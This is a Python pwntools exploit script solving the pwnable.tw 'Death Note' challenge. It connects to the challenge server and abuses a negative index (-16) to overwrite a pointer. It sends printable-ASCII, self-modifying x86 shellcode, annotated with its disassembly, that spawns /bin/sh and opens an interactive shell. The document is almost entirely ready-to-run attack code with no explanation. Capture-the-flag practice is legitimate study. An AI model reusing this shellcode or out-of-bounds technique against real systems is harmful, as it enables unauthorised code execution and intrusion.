#Exploit for pwnable.tw/Death Note
from pwn import *
target = remote('chall.pwnable.tw', 10201)
#Every byte must be >0x20 and <0x7f and is being inputted by read(), max size - 0x50 bytes
'''
0:  6a 41                   push   0x41
2:  58                      pop    eax
3:  34 41                   xor    al,0x41
5:  50                      push   eax
6:  59                      pop    ecx
7:  66 35 3e 22             xor    ax,0x223e
b:  66 2d 38 52             sub    ax,0x5238
f:  66 2d 39 4f             sub    ax,0x4f39
13: 66 35 41 41             xor    ax,0x4141
17: 31 42 2f                xor    DWORD PTR [edx+0x2f],eax
1a: 51                      push   ecx
1b: 58                      pop    eax
1c: 34 41                   xor    al,0x41
1e: 34 4a                   xor    al,0x4a
20: 51                      push   ecx
21: 51                      push   ecx
22: 5a                      pop    edx
23: 68 2f 2f 73 68          push   0x68732f2f
28: 68 2f 62 69 6e          push   0x6e69622f
2d: 54                      push   esp
2e: 5b                      pop    ebx
2f: cd 80                   int    0x80	;replace this with \x41\x41
'''
def add(index, name):
	target.sendlineafter("choice :", "1")
	target.sendlineafter("Index :",str(index))
	target.sendlineafter("Name :", name)
	
shellcode = "\x6A\x41\x58\x34\x41\x50\x59\x66\x35\x3E\x22\x66\x2D\x38\x52\x66\x2D\x39\x4F\x66\x35\x41\x41\x31\x42\x2F\x51\x58\x34\x41\x34\x4A\x51\x51\x5A\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x54\x5B\x41\x41"
add(-16, shellcode)
target.interactive()
